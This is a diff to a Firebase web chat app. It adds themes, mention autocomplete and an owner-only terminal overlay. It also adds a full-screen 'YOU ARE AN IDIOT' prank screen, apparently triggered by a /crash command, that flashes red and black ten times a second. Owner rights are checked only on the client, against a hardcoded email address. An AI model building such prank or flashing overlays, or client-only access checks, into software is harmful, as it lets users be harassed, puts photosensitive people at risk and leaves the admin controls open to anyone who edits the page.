@@ -26,6 +26,8 @@
             --typing-indicator: #94a3b8;
             --mention-bg: #fef9c3;
             --mention-text: #854d0e;
+            --terminal-bg: #1a1a1a;
+            --terminal-text: #00ff00;
         }
 
         .theme-dark {
@@ -44,6 +46,18 @@
             --mention-text: #fef9c3;
         }
 
+        .theme-blue { --primary: #3b82f6; --background: #eff6ff; --surface: #dbeafe; }
+        .theme-green { --primary: #10b981; --background: #f0fdf4; --surface: #dcfce7; }
+        .theme-purple { --primary: #a855f7; --background: #faf5ff; --surface: #f3e8ff; }
+        .theme-red { --primary: #ef4444; --background: #fef2f2; --surface: #fee2e2; }
+        .theme-orange { --primary: #f97316; --background: #fff7ed; --surface: #ffedd5; }
+        .theme-pink { --primary: #ec4899; --background: #fdf2f8; --surface: #fce7f3; }
+        .theme-teal { --primary: #14b8a6; --background: #f0fdfa; --surface: #ccfbf1; }
+        .theme-indigo { --primary: #6366f1; --background: #eef2ff; --surface: #e0e7ff; }
+        .theme-cyan { --primary: #06b6d4; --background: #ecfeff; --surface: #cffafe; }
+        .theme-lime { --primary: #84cc16; --background: #f7fee7; --surface: #ecfccb; }
+        .theme-amber { --primary: #f59e0b; --background: #fffbeb; --surface: #fef3c7; }
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
             background-color: var(--background);
@@ -54,6 +68,7 @@
 
         .hidden { display: none !important; }
 
+        /* Auth Pages */
         .auth-container {
             display: flex;
             justify-content: center;
@@ -156,6 +171,7 @@
             font-size: 0.875rem;
         }
 
+        /* Main Chat Layout */
         .chat-container { display: flex; height: 100vh; overflow: hidden; }
 
         .sidebar {
@@ -360,6 +376,14 @@
         }
 
         .message-content { margin-bottom: 0.25rem; }
+        
+        .mention-highlight {
+            background: var(--warning);
+            color: var(--mention-text);
+            padding: 0.1rem 0.3rem;
+            border-radius: 0.25rem;
+            font-weight: 600;
+        }
 
         .message-footer {
             display: flex;
@@ -385,6 +409,7 @@
 
         .message-actions button:hover { background: rgba(0,0,0,0.1); }
 
+        /* Typing Indicator */
         .typing-indicator-wrapper {
             width: 100%;
             padding: 0.5rem 1rem;
@@ -430,6 +455,7 @@
             border-top: 1px solid var(--border);
             display: flex;
             gap: 0.5rem;
+            position: relative;
         }
 
         .input-container input {
@@ -449,6 +475,50 @@
             color: white;
             font-weight: 600;
             cursor: pointer;
+        }
+
+        /* Autocomplete dropdown */
+        .autocomplete-dropdown {
+            position: absolute;
+            bottom: 100%;
+            left: 1rem;
+            right: 1rem;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 0.5rem;
+            max-height: 200px;
+            overflow-y: auto;
+            box-shadow: 0 -4px 12px rgba(0,0,0,0.1);
+            z-index: 100;
+        }
+
+        .autocomplete-item {
+            padding: 0.75rem 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            cursor: pointer;
+            transition: background 0.2s;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .autocomplete-item:last-child {
+            border-bottom: none;
+        }
+
+        .autocomplete-item:hover {
+            background: var(--background);
+        }
+
+        .autocomplete-item.selected {
+            background: var(--primary);
+            color: white;
+        }
+
+        .autocomplete-item .avatar {
+            width: 2rem;
+            height: 2rem;
+            font-size: 1.2rem;
         }
 
         .readonly-bar {
@@ -475,10 +545,7 @@
             flex-shrink: 0;
         }
 
-        .channel-badge.group {
-            background: #8b5cf6;
-        }
-
+        /* Modal */
         .modal {
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
@@ -516,6 +583,7 @@
             color: var(--text-secondary);
         }
 
+        /* Admin Panel */
         .admin-panel { padding: 1rem; }
 
         .admin-section {
@@ -528,10 +596,131 @@
 
         .admin-section h3 { margin-bottom: 1rem; color: var(--primary); }
 
+        /* Owner section highlight */
         .admin-section.owner-section {
             border-color: var(--owner-color);
         }
         .admin-section.owner-section h3 { color: var(--owner-color); }
+
+        /* Terminal */
+        .terminal-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--terminal-bg);
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            padding: 1rem;
+            font-family: 'Courier New', monospace;
+        }
+
+        .terminal-header {
+            color: var(--terminal-text);
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-bottom: 1rem;
+            border-bottom: 1px solid var(--terminal-text);
+            padding-bottom: 0.5rem;
+        }
+
+        .terminal-output {
+            flex: 1;
+            overflow-y: auto;
+            color: var(--terminal-text);
+            font-size: 1rem;
+            margin-bottom: 1rem;
+        }
+
+        .terminal-line {
+            margin-bottom: 0.25rem;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .terminal-input-line {
+            display: flex;
+            color: var(--terminal-text);
+        }
+
+        .terminal-prompt {
+            margin-right: 0.5rem;
+            color: var(--terminal-text);
+        }
+
+        .terminal-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: var(--terminal-text);
+            font-family: 'Courier New', monospace;
+            font-size: 1rem;
+            outline: none;
+        }
+
+        .terminal-close {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            background: var(--danger);
+            color: white;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 0.25rem;
+            cursor: pointer;
+            z-index: 10001;
+        }
+
+        /* Idiot screen */
+        .idiot-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #000;
+            z-index: 20000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            animation: idiotFlash 0.1s infinite;
+        }
+
+        @keyframes idiotFlash {
+            0% { background: #000; }
+            50% { background: #f00; }
+            100% { background: #000; }
+        }
+
+        .idiot-text {
+            color: #fff;
+            font-size: 4rem;
+            font-weight: bold;
+            text-align: center;
+            animation: idiotSpin 0.5s infinite;
+        }
+
+        @keyframes idiotSpin {
+            0% { transform: rotate(0deg); }
+            25% { transform: rotate(5deg); }
+            75% { transform: rotate(-5deg); }
+            100% { transform: rotate(0deg); }
+        }
+
+        .idiot-subtext {
+            color: #ff0;
+            font-size: 2rem;
+            margin-top: 2rem;
+            animation: idiotBounce 0.3s infinite;
+        }
+
+        @keyframes idiotBounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
 
         .stats-grid {
             display: grid;
@@ -563,6 +752,7 @@
         .user-item-info { display: flex; align-items: center; gap: 0.5rem; }
         .user-actions { display: flex; gap: 0.5rem; }
 
+        /* Maintenance Mode / Game */
         .maintenance-container {
             display: flex;
             flex-direction: column;
@@ -587,6 +777,7 @@
 
         .game-info { margin-top: 1rem; font-size: 1.5rem; font-weight: bold; }
 
+        /* Settings Panel */
         .settings-panel { padding: 1rem; }
 
         .theme-selector {
@@ -610,6 +801,7 @@
         .theme-btn:hover { border-color: var(--primary); }
         .theme-btn.active { border-color: var(--primary); background: var(--primary); color: white; }
 
+        /* Loading Spinner */
         .spinner {
             border: 3px solid rgba(255,255,255,0.3);
             border-top-color: white;
@@ -631,6 +823,7 @@
             z-index: 2000;
         }
 
+        /* Mobile Responsive */
         @media (max-width: 768px) {
             .sidebar {
                 position: fixed;
@@ -654,6 +847,7 @@
 
         @media (min-width: 769px) { .menu-toggle { display: none; } }
 
+        /* Tabs */
         .tabs {
             display: flex;
             border-bottom: 1px solid var(--border);
@@ -674,6 +868,7 @@
         .tab-content { display: none; padding: 1rem 0; }
         .tab-content.active { display: block; }
 
+        /* Emoji Picker */
         .emoji-grid {
             display: grid;
             grid-template-columns: repeat(8, 1fr);
@@ -694,6 +889,7 @@
         .emoji-btn:hover { border-color: var(--primary); transform: scale(1.1); }
         .emoji-btn.selected { border-color: var(--primary); background: var(--primary); }
 
+        /* Search */
         .search-box {
             padding: 1rem;
             border-bottom: 1px solid var(--border);
@@ -721,6 +917,7 @@
         .badge.admin { background: var(--danger); }
         .badge.owner { background: linear-gradient(135deg, #f59e0b, #b45309); color: white; }
 
+        /* Toast Notifications */
         .toast-container {
             position: fixed;
             top: 1rem; right: 1rem;
@@ -776,6 +973,7 @@
 
         .toast.removing { animation: slideOut 0.3s ease forwards; }
 
+        /* Broadcast Banner */
         .broadcast-banner {
             position: fixed;
             top: 0; left: 0; right: 0;
@@ -824,6 +1022,7 @@
 
         .broadcast-close:hover { background: rgba(255,255,255,0.3); transform: scale(1.05); }
 
+        /* Owner URL Confirmation Dialog */
         .owner-url-dialog {
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
@@ -869,6 +1068,7 @@
             justify-content: flex-end;
         }
 
+        /* Image messages */
         .message-image {
             max-width: 100%;
             max-height: 300px;
@@ -882,6 +1082,7 @@
 
         .message-image:hover { opacity: 0.9; }
 
+        /* URL preview cards */
         .url-preview {
             display: flex;
             gap: 0.75rem;
@@ -940,6 +1141,7 @@
             text-overflow: ellipsis;
         }
 
+        /* Group section in sidebar */
         .sidebar-section-header {
             padding: 0.5rem 1rem;
             font-size: 0.7rem;
@@ -951,6 +1153,7 @@
             border-bottom: 1px solid var(--border);
         }
 
+        /* Admin grid buttons */
         .admin-grid-2 {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -963,6 +1166,7 @@
             gap: 0.5rem;
         }
 
+        /* Scrollable user select list */
         .user-select-list {
             max-height: 250px;
             overflow-y: auto;
@@ -986,6 +1190,7 @@
 </head>
 <body class="theme-dark">
 
+    <!-- Broadcast Banner -->
     <div id="broadcastBanner" class="broadcast-banner hidden">
         <div class="broadcast-content">
             <span class="broadcast-icon">📢</span>
@@ -994,12 +1199,15 @@
         <button class="broadcast-close" onclick="dismissBroadcast()">Dismiss</button>
     </div>
 
+    <!-- Toast Container -->
     <div id="toastContainer" class="toast-container"></div>
 
+    <!-- Loading Overlay -->
     <div id="loadingOverlay" class="loading-overlay hidden">
         <div class="spinner"></div>
     </div>
 
+    <!-- Owner URL Confirmation Dialog -->
     <div id="ownerUrlDialog" class="owner-url-dialog hidden">
         <div class="owner-url-dialog-box">
             <h3>👑 Admin wil een URL openen</h3>
@@ -1012,7 +1220,8 @@
         </div>
     </div>
 
-    <div id="loginPage" class="auth-container">
+    <!-- Login Page -->
+    <div id="loginPage" class="auth-container hidden">
         <div class="auth-box">
             <h2>🔐 Login</h2>
             <div id="loginError" class="error hidden"></div>
@@ -1031,6 +1240,7 @@
         </div>
     </div>
 
+    <!-- Register Page -->
     <div id="registerPage" class="auth-container hidden">
         <div class="auth-box">
             <h2>📝 Register</h2>
@@ -1054,6 +1264,7 @@
         </div>
     </div>
 
+    <!-- Maintenance Mode -->
     <div id="maintenancePage" class="maintenance-container hidden">
         <div style="max-width: 600px; text-align: center;">
             <div style="font-size: 5rem; margin-bottom: 1rem;">🔧</div>
@@ -1072,7 +1283,9 @@
         </div>
     </div>
 
+    <!-- Main Chat Application -->
     <div id="chatApp" class="chat-container hidden">
+        <!-- Sidebar -->
         <div id="sidebar" class="sidebar">
             <div class="sidebar-header">
                 <div class="user-info">
@@ -1084,6 +1297,7 @@
                 </div>
             </div>
 
+            <!-- Search users for DMs -->
             <div class="search-box">
                 <input type="text" id="userSearch" placeholder="Search users for DM..." onkeyup="searchUsersDebounced()">
             </div>
@@ -1103,6 +1317,7 @@
             </div>
         </div>
 
+        <!-- Main Content -->
         <div class="main-content">
             <div class="chat-header">
                 <button class="menu-toggle" onclick="toggleSidebar()">☰</button>
@@ -1116,7 +1331,7 @@
                         <button class="btn-small" onclick="showAdminPanel()">👑 Admin</button>
                     </div>
                     <div id="ownerButton" class="hidden">
-                        <button class="btn-small btn-owner" onclick="showOwnerPanel()">⭐ Owner</button>
+                        <button class="btn-small btn-owner" onclick="showOwnerTerminal()">💻 Terminal</button>
                     </div>
                 </div>
             </div>
@@ -1132,8 +1347,9 @@
             </div>
 
             <div id="inputContainer" class="input-container">
-                <input type="text" id="messageInput" placeholder="Type a message... (Use @ to mention)" onkeypress="handleMessageKeyPress(event)" oninput="handleTyping()">
+                <input type="text" id="messageInput" placeholder="Type a message... (Use @ to mention)" onkeypress="handleMessageKeyPress(event)" oninput="handleTyping(); handleMentionAutocomplete(event)" onkeydown="handleAutocompleteKeydown(event)">
                 <button onclick="sendMessage()">Send</button>
+                <div id="autocompleteDropdown" class="autocomplete-dropdown hidden"></div>
             </div>
             <div id="readonlyBar" class="readonly-bar hidden">
                 📣 Only admins can post in Announcements — you can read only
@@ -1141,6 +1357,18 @@
         </div>
     </div>
 
+    <!-- Owner Terminal -->
+    <div id="ownerTerminal" class="terminal-container hidden">
+        <button class="terminal-close" onclick="closeOwnerTerminal()">Close Terminal</button>
+        <div class="terminal-header">👑 Owner Terminal v1.0</div>
+        <div id="terminalOutput" class="terminal-output"></div>
+        <div class="terminal-input-line">
+            <span class="terminal-prompt">#&gt;</span>
+            <input type="text" id="terminalInput" class="terminal-input" placeholder="Type command... (help for list)" onkeypress="handleTerminalKeypress(event)">
+        </div>
+    </div>
+
+    <!-- Settings Modal -->
     <div id="settingsModal" class="modal hidden">
         <div class="modal-content">
             <div class="modal-header">
@@ -1186,28 +1414,7 @@
         </div>
     </div>
 
-    <div id="createGroupModal" class="modal hidden">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>👥 Create Group</h3>
-                <button class="close-btn" onclick="closeCreateGroupModal()">×</button>
-            </div>
-            <div class="form-group">
-                <label>Group Name</label>
-                <input type="text" id="groupNameInput" placeholder="e.g. Gaming Squad">
-            </div>
-            <div class="form-group">
-                <label>Group Emoji / Icon</label>
-                <input type="text" id="groupEmojiInput" placeholder="e.g. 🎮" maxlength="4" style="font-size:1.5rem;">
-            </div>
-            <div class="form-group">
-                <label>Add Members (select at least 2 others)</label>
-                <div class="user-select-list" id="groupMemberList"></div>
-            </div>
-            <button class="btn" onclick="createGroup()">Create Group</button>
-        </div>
-    </div>
-
+    <!-- Admin Panel Modal -->
     <div id="adminModal" class="modal hidden">
         <div class="modal-content" style="max-width: 850px;">
             <div class="modal-header">
@@ -1223,6 +1430,7 @@
                 <div class="tab" onclick="switchAdminTab('ipTab', event)">🌐 IP</div>
             </div>
 
+            <!-- Stats Tab -->
             <div id="statsTab" class="tab-content active" style="padding: 1rem;">
                 <div class="admin-section">
                     <h3>📊 Statistics</h3>
@@ -1247,6 +1455,7 @@
                 </div>
             </div>
 
+            <!-- Users Tab -->
             <div id="usersTab" class="tab-content" style="padding: 1rem;">
                 <div class="admin-section">
                     <h3>👥 User Management</h3>
@@ -1254,6 +1463,7 @@
                 </div>
             </div>
 
+            <!-- System Tab -->
             <div id="systemTab" class="tab-content" style="padding: 1rem;">
                 <div class="admin-section">
                     <h3>🎮 System Controls</h3>
@@ -1269,6 +1479,7 @@
                 </div>
             </div>
 
+            <!-- Broadcast Tab -->
             <div id="broadcastTabPanel" class="tab-content" style="padding: 1rem;">
                 <div class="admin-section">
                     <h3>📢 Broadcast Message</h3>
@@ -1279,6 +1490,7 @@
                 </div>
             </div>
 
+            <!-- IP Tab -->
             <div id="ipTab" class="tab-content" style="padding: 1rem;">
                 <div class="admin-section">
                     <h3>🌐 IP Address Tracking</h3>
@@ -1301,6 +1513,7 @@
         </div>
     </div>
 
+    <!-- Owner Panel Modal (keeping for compatibility) -->
     <div id="ownerModal" class="modal hidden">
         <div class="modal-content" style="max-width: 700px; border: 2px solid var(--owner-color);">
             <div class="modal-header">
@@ -1328,6 +1541,7 @@
         </div>
     </div>
 
+    <!-- URL Redirect Modal -->
     <div id="urlRedirectModal" class="modal hidden">
         <div class="modal-content">
             <div class="modal-header">
@@ -1354,6 +1568,7 @@
         </div>
     </div>
 
+    <!-- Page Reload Modal -->
     <div id="pageReloadModal" class="modal hidden">
         <div class="modal-content">
             <div class="modal-header">
@@ -1369,12 +1584,20 @@
         </div>
     </div>
 
+    <!-- Idiot Screen (for /crash command) -->
+    <div id="idiotScreen" class="idiot-screen hidden">
+        <div class="idiot-text">YOU ARE AN IDIOT</div>
+        <div class="idiot-subtext">HA HA HA HA HA HA</div>
+    </div>
+
+    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
     <script>
+        // ==================== FIREBASE CONFIGURATION ====================
         const firebaseConfig = {
             apiKey: "AIzaSyCdPQzgTtMRoJdjgjnHhoX66JKyLSnY6ug",
             authDomain: "ultimate-chat-b8c08.firebaseapp.com",
@@ -1390,19 +1613,27 @@
         const db = firebase.firestore();
         const rtdb = firebase.database();
 
+        // ==================== OWNER CONFIG (HARDCODED) ====================
         const OWNER_USERNAME = 'theredgummybear16@gmail.com';
 
         function isOwnerUser(username) {
             return username === OWNER_USERNAME;
         }
 
+        // ==================== GLOBAL STATE ====================
         let currentUser = null;
         let currentChat = 'global';
         let messageListeners = {};
         let editingMessageId = null;
         let typingTimeout = null;
         let typingListeners = {};
+        
+        // Autocomplete state
+        let autocompleteUsers = [];
+        let autocompleteIndex = -1;
+        let mentionStartPos = -1;
 
+        // Caches
         let usersCache = {};
         let usersCacheTimestamp = 0;
         const USERS_CACHE_TTL = 60 * 1000;
@@ -1413,12 +1644,16 @@
 
         let cachedBlockedIPs = [];
 
+        // Debounce timer
         let searchDebounceTimer = null;
 
+        // Unread counters
         let unreadCounts = { global: 0, announcements: 0 };
 
+        // Notification permission
         let notificationPermission = false;
 
+        // Pending owner URL
         let pendingOwnerUrl = null;
         let pendingOwnerBroadcastId = null;
 
@@ -1426,6 +1661,7 @@
 
         const THEMES = ['light','dark','blue','green','purple','red','orange','pink','teal','indigo','cyan','lime','amber'];
 
+        // ==================== NOTIFICATION HELPER ====================
         function requestNotificationPermission() {
             if (!("Notification" in window)) return;
             if (Notification.permission === "granted") {
@@ -1444,6 +1680,7 @@
             } catch(e) {}
         }
 
+        // ==================== UNREAD BADGE ====================
         function updateUnreadBadge(chatId) {
             document.querySelectorAll('.chat-item').forEach(item => {
                 const onclick = item.getAttribute('onclick');
@@ -1468,6 +1705,7 @@
             });
         }
 
+        // ==================== TOAST ====================
         function showToast(message, type = 'info') {
             const container = document.getElementById('toastContainer');
             const toast = document.createElement('div');
@@ -1485,6 +1723,7 @@
             }, 5000);
         }
 
+        // ==================== UTILITY ====================
         async function hashPassword(password, salt) {
             const encoder = new TextEncoder();
             const data = encoder.encode(password + salt);
@@ -1540,6 +1779,7 @@
             return cachedBlockedIPs.includes(ip);
         }
 
+        // ==================== USER CACHE ====================
         async function getCachedUsers(forceRefresh = false) {
             const now = Date.now();
             if (!forceRefresh && usersCacheTimestamp && (now - usersCacheTimestamp) < USERS_CACHE_TTL) {
@@ -1568,6 +1808,7 @@
 
         function invalidateUsersCache() { usersCacheTimestamp = 0; }
 
+        // ==================== MAINTENANCE CACHE ====================
         async function getMaintenanceStatus(forceRefresh = false) {
             const now = Date.now();
             if (!forceRefresh && maintenanceCacheTimestamp && (now - maintenanceCacheTimestamp) < MAINTENANCE_CACHE_TTL) {
@@ -1581,6 +1822,7 @@
 
         function invalidateMaintenanceCache() { maintenanceCacheTimestamp = 0; }
 
+        // ==================== AUTHENTICATION ====================
         async function register(username, password) {
             try {
                 showLoading();
@@ -1746,6 +1988,7 @@
             }
         }
 
+        // ==================== USER STATUS ====================
         function setUserOnline(userId, online) {
             rtdb.ref('status/' + userId).set({ online, lastSeen: firebase.database.ServerValue.TIMESTAMP });
             if (online) {
@@ -1757,6 +2000,7 @@
             rtdb.ref('status/' + userId).on('value', snapshot => callback(snapshot.val()));
         }
 
+        // ==================== CHAT FUNCTIONS ====================
         function showChatApp() {
             document.getElementById('loginPage').classList.add('hidden');
             document.getElementById('registerPage').classList.add('hidden');
@@ -1791,6 +2035,7 @@
         async function loadChatList() {
             const chatList = document.getElementById('chatList');
             
+            // Start with channels
             chatList.innerHTML = `
                 <div class="sidebar-section-header">Channels</div>
                 <div class="chat-item ${currentChat === 'global' ? 'active' : ''}" onclick="selectChat('global')">
@@ -1813,6 +2058,7 @@
             `;
 
             try {
+                // Load users for DMs
                 const users = (await getCachedUsers()).filter(u => u.id !== currentUser.id);
 
                 const chatsRef = rtdb.ref('privateChats');
@@ -1922,6 +2168,7 @@
             }
 
             hideTypingIndicator();
+            hideAutocomplete();
             loadMessages(chatId);
             updateUnreadBadge(chatId);
 
@@ -1932,19 +2179,18 @@
             const container = document.getElementById('messagesContainer');
             container.innerHTML = '';
 
-            if (messageListeners[chatId]) {
-                const prev = messageListeners[chatId];
+            if (messageListeners[currentChat]) {
+                const prev = messageListeners[currentChat];
                 if (typeof prev === 'function') prev();
             }
-            if (messageListeners[chatId + '_new']) {
-                const prev = messageListeners[chatId + '_new'];
+            if (messageListeners[currentChat + '_new']) {
+                const prev = messageListeners[currentChat + '_new'];
                 if (typeof prev === 'function') prev();
             }
 
             if (chatId === 'announcements') {
                 let knownMessageIds = null;
                 const unsubscribe = db.collection('announcements').onSnapshot(snapshot => {
-                    if (currentChat !== 'announcements') return;
                     container.innerHTML = '';
                     const messages = [];
                     snapshot.forEach(doc => { const data = doc.data(); if (data.timestamp) messages.push({ id: doc.id, ...data }); });
@@ -1970,7 +2216,6 @@
             } else if (chatId === 'global') {
                 let knownMessageIds = null;
                 const unsubscribe = db.collection('messages').onSnapshot(snapshot => {
-                    if (currentChat !== 'global') return;
                     container.innerHTML = '';
                     const messages = [];
                     snapshot.forEach(doc => { const data = doc.data(); if (data.timestamp) messages.push({ id: doc.id, ...data }); });
@@ -1979,6 +2224,7 @@
                     lastMessages.forEach(msg => displayMessage(msg, container));
                     scrollToBottom();
                     
+                    // Check for mentions in new messages
                     if (knownMessageIds !== null) {
                         lastMessages.forEach(msg => {
                             if (!knownMessageIds.has(msg.id) && msg.userId !== currentUser.id) {
@@ -2013,27 +2259,25 @@
                 messageListeners[chatId] = unsubscribe;
 
             } else {
+                // Private chat
                 const messagesRef = rtdb.ref(`privateChats/${chatId}/messages`).orderByChild('timestamp').limitToLast(100);
-                messagesRef.off();
                 messagesRef.on('value', snapshot => {
-                    if (currentChat !== chatId) return;
                     container.innerHTML = '';
                     const messages = [];
                     snapshot.forEach(child => {
-                        const msg = child.val();
-                        messages.push({ id: child.key, ...msg });
+                        const msg = { id: child.key, ...child.val() };
+                        messages.push(msg);
                     });
                     messages.sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
                     messages.forEach(msg => displayMessage(msg, container, true));
                     scrollToBottom();
                 }, error => { 
                     console.error('Error loading private messages:', error);
-                    showToast('Error loading private messages: ' + error.message, 'error'); 
+                    showToast('Error loading messages: ' + error.message, 'error'); 
                 });
                 messageListeners[chatId] = () => messagesRef.off();
 
                 const newPrivateRef = rtdb.ref(`privateChats/${chatId}/messages`).orderByChild('timestamp').limitToLast(1);
-                newPrivateRef.off();
                 let privateListenerReady = false;
                 newPrivateRef.on('child_added', snapshot => {
                     if (!privateListenerReady) { 
@@ -2072,6 +2316,7 @@
             if (isPrivate && !isSystem) className += ' private';
             if (isAnnouncement && !isSystem) className += ' announcement';
             
+            // Check for mentions
             const mentionRegex = new RegExp('@' + currentUser.username + '\\b', 'i');
             const isMentioned = mentionRegex.test(message.content);
             const isEveryoneMention = message.content && message.content.includes('@everyone');
@@ -2120,16 +2365,17 @@
             parts.forEach(part => {
                 if (part.type === 'text') {
                     let text = sanitizeHTML(part.value);
+                    
                     text = text.replace(
                         /@everyone\b/g,
-                        '<span style="background: var(--danger); color: white; padding: 0.1rem 0.3rem; border-radius: 0.25rem;">@everyone</span>'
+                        '<span class="mention-highlight">@everyone</span>'
                     );
                     
                     const allUsers = Object.values(usersCache);
                     allUsers.forEach(user => {
                         if (user.username) {
                             const userMentionRegex = new RegExp('@' + user.username + '\\b', 'g');
-                            text = text.replace(userMentionRegex, '<span style="background: var(--warning); color: var(--mention-text); padding: 0.1rem 0.3rem; border-radius: 0.25rem;">@' + user.username + '</span>');
+                            text = text.replace(userMentionRegex, '<span class="mention-highlight">@' + user.username + '</span>');
                         }
                     });
                     
@@ -2190,6 +2436,7 @@
             }
 
             clearTyping();
+            hideAutocomplete();
 
             try {
                 const messageData = {
@@ -2219,7 +2466,8 @@
                         await db.collection('announcements').add(messageData);
                     } else {
                         messageData.timestamp = firebase.database.ServerValue.TIMESTAMP;
-                        await rtdb.ref(`privateChats/${currentChat}/messages`).push(messageData);
+                        const newMsgRef = await rtdb.ref(`privateChats/${currentChat}/messages`).push(messageData);
+                        console.log('Message sent to private chat:', currentChat, newMsgRef.key);
                     }
                 }
 
@@ -2273,6 +2521,127 @@
             container.scrollTop = container.scrollHeight;
         }
 
+        // ==================== MENTION AUTOCOMPLETE ====================
+        async function handleMentionAutocomplete(event) {
+            const input = document.getElementById('messageInput');
+            const cursorPos = input.selectionStart;
+            const text = input.value;
+            const dropdown = document.getElementById('autocompleteDropdown');
+            
+            let lastAtIndex = -1;
+            for (let i = cursorPos - 1; i >= 0; i--) {
+                if (text[i] === '@') {
+                    if (i === 0 || text[i-1].match(/\s/)) {
+                        lastAtIndex = i;
+                        break;
+                    } else {
+                        break;
+                    }
+                }
+            }
+            
+            if (lastAtIndex !== -1) {
+                const searchTerm = text.substring(lastAtIndex + 1, cursorPos).toLowerCase();
+                mentionStartPos = lastAtIndex;
+                
+                const users = await getCachedUsers();
+                autocompleteUsers = users
+                    .filter(u => u.id !== currentUser.id && u.username.toLowerCase().startsWith(searchTerm))
+                    .slice(0, 5);
+                
+                if (autocompleteUsers.length > 0) {
+                    renderAutocomplete(searchTerm);
+                    dropdown.classList.remove('hidden');
+                    autocompleteIndex = 0;
+                    highlightAutocompleteItem();
+                } else {
+                    hideAutocomplete();
+                }
+            } else {
+                hideAutocomplete();
+            }
+        }
+
+        function renderAutocomplete(searchTerm) {
+            const dropdown = document.getElementById('autocompleteDropdown');
+            dropdown.innerHTML = '';
+            
+            autocompleteUsers.forEach((user, index) => {
+                const item = document.createElement('div');
+                item.className = 'autocomplete-item';
+                item.dataset.index = index;
+                item.onclick = () => selectAutocompleteUser(user.username);
+                
+                let badge = '';
+                if (isOwnerUser(user.username)) {
+                    badge = '<span class="badge owner" style="font-size:0.6rem;">⭐</span>';
+                } else if (user.isAdmin) {
+                    badge = '<span class="badge admin" style="font-size:0.6rem;">👑</span>';
+                }
+                
+                item.innerHTML = `
+                    <span class="avatar">${user.avatar}</span>
+                    <span style="flex:1;">${sanitizeHTML(user.username)} ${badge}</span>
+                    <span style="color:var(--text-secondary); font-size:0.75rem;">${user.username.toLowerCase().startsWith(searchTerm) ? 'Match' : ''}</span>
+                `;
+                dropdown.appendChild(item);
+            });
+        }
+
+        function highlightAutocompleteItem() {
+            const items = document.querySelectorAll('.autocomplete-item');
+            items.forEach((item, index) => {
+                if (index === autocompleteIndex) {
+                    item.classList.add('selected');
+                } else {
+                    item.classList.remove('selected');
+                }
+            });
+        }
+
+        function handleAutocompleteKeydown(event) {
+            const dropdown = document.getElementById('autocompleteDropdown');
+            if (dropdown.classList.contains('hidden')) return;
+            
+            if (event.key === 'ArrowDown') {
+                event.preventDefault();
+                autocompleteIndex = (autocompleteIndex + 1) % autocompleteUsers.length;
+                highlightAutocompleteItem();
+            } else if (event.key === 'ArrowUp') {
+                event.preventDefault();
+                autocompleteIndex = (autocompleteIndex - 1 + autocompleteUsers.length) % autocompleteUsers.length;
+                highlightAutocompleteItem();
+            } else if (event.key === 'Tab' || event.key === 'Enter') {
+                if (autocompleteIndex >= 0 && autocompleteUsers[autocompleteIndex]) {
+                    event.preventDefault();
+                    selectAutocompleteUser(autocompleteUsers[autocompleteIndex].username);
+                }
+            } else if (event.key === 'Escape') {
+                hideAutocomplete();
+            }
+        }
+
+        function selectAutocompleteUser(username) {
+            const input = document.getElementById('messageInput');
+            const text = input.value;
+            const beforeMention = text.substring(0, mentionStartPos + 1);
+            const afterMention = text.substring(input.selectionStart);
+            
+            input.value = beforeMention + username + ' ' + afterMention;
+            input.focus();
+            input.selectionStart = input.selectionEnd = mentionStartPos + 1 + username.length + 1;
+            
+            hideAutocomplete();
+        }
+
+        function hideAutocomplete() {
+            document.getElementById('autocompleteDropdown').classList.add('hidden');
+            autocompleteUsers = [];
+            autocompleteIndex = -1;
+            mentionStartPos = -1;
+        }
+
+        // ==================== TYPING INDICATOR ====================
         function handleTyping() {
             if (!currentUser) return;
             
@@ -2337,6 +2706,7 @@
             document.getElementById('typingIndicator').classList.add('hidden');
         }
 
+        // ==================== SEARCH USERS ====================
         function searchUsersDebounced() {
             clearTimeout(searchDebounceTimer);
             searchDebounceTimer = setTimeout(searchUsers, 300);
@@ -2425,10 +2795,7 @@
             loadChatList();
         }
 
-        function showCreateGroupModal() { showToast('Groups are currently disabled', 'info'); }
-        function closeCreateGroupModal() { document.getElementById('createGroupModal').classList.add('hidden'); }
-        function createGroup() { showToast('Groups are currently disabled', 'info'); }
-
+        // ==================== SETTINGS ====================
         function showSettings() {
             document.getElementById('settingsModal').classList.remove('hidden');
             initializeEmojiPicker();
@@ -2500,6 +2867,179 @@
 
         function applyTheme(theme) { document.body.className = 'theme-' + theme; }
 
+        // ==================== OWNER TERMINAL ====================
+        function showOwnerTerminal() {
+            if (!currentUser.isOwner) {
+                showToast('Access denied', 'error');
+                return;
+            }
+            document.getElementById('ownerTerminal').classList.remove('hidden');
+            const output = document.getElementById('terminalOutput');
+            output.innerHTML = '';
+            addTerminalLine('Owner Terminal initialized. Type "help" for commands.', 'info');
+            document.getElementById('terminalInput').focus();
+        }
+
+        function closeOwnerTerminal() {
+            document.getElementById('ownerTerminal').classList.add('hidden');
+        }
+
